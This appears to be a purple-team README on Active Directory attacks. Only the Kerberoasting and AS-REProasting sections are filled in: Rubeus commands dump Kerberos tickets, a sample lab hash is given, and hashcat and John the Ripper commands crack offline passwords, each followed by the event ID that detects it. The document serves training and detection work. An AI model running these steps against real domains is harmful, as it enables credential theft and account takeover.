# Cybersecurity Windows Purple Project Documentation
Cybersecurity Red team and Blue team tooling for ease of use during penetration test and purple team exercises. 

## Table of Contents

1. [Kerberoasting](#kerberoasting)
2. [AS-REProasting](#as-reproasting)
3. [GPP Passwords](#gpp-passwords)
4. [GPO Permissions/GPO Files](#gpo-permissionsgpo-files)
5. [Credentials in Shares](#credentials-in-shares)
6. [Credentials in Object Properties](#credentials-in-object-properties)
7. [DCSync](#dcsync)
8. [Golden Ticket](#golden-ticket)
9. [Kerberos Constrained Delegation](#kerberos-constrained-delegation)
10. [Print Spooler & NTLM Relaying](#print-spooler--ntlm-relaying)
11. [Coercing Attacks & Unconstrained Delegation](#coercing-attacks--unconstrained-delegation)
12. [Object ACLs](#object-acls)
13. [PKI - ESC1](#pki---esc1)

---

## Kerberoasting
To obtain crackable tickets, we can use [Rubeus](https://github.com/GhostPack/Rubeus) 

`PS C:\Users\bob\Downloads> .\Rubeus.exe kerberoast /outfile:spn.txt`

We can use hashcat with the hash-mode (option -m) 13100 for a Kerberoastable TGS. 
We also pass a [dictionary file](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials) with passwords (the file passwords.txt) and save the output of any successfully cracked tickets to a file called cracked.txt:

`hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"`

Alternatively, the captured TGS hashes can be cracked with John The Ripper:

`sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot`

*Detection*: When a TGS is requested, an event log with ID 4769 is generated.

## AS-REProasting
To obtain crackable hashes, we can use [Rubeus](https://github.com/GhostPack/Rubeus) we can obtain crackable hashes for user accounts that have the property Do not require "Kerberos preauthentication enabled".

`PS C:\Users\bob\Downloads> .\Rubeus.exe asreproast /outfile:asrep.txt`

For hashcat to be able to recognize the hash, we need to edit it by adding 23$ after $krb5asrep$:

`$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550`

We can now use hashcat with the hash-mode (option -m) 18200 for AS-REPRoastable hashes. We also pass a dictionary file with passwords (the file passwords.txt) and save the output of any successfully cracked tickets to the file asrepcracked.txt:

`sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force`

*Detection*: When we executed Rubeus, an Event with ID 4768 was generated, signaling that a Kerberos Authentication ticket was generated

## GPP Passwords

*Coming soon...*

## GPO Permissions/GPO Files

*Coming soon...*

## Credentials in Shares

*Coming soon...*

## Credentials in Object Properties

*Coming soon...*

## DCSync

*Coming soon...*

## Golden Ticket

*Coming soon...*

## Kerberos Constrained Delegation

*Coming soon...*

## Print Spooler & NTLM Relaying

*Coming soon...*

## Coercing Attacks & Unconstrained Delegation

*Coming soon...*

## Object ACLs

*Coming soon...*

## PKI - ESC1

*Coming soon...*


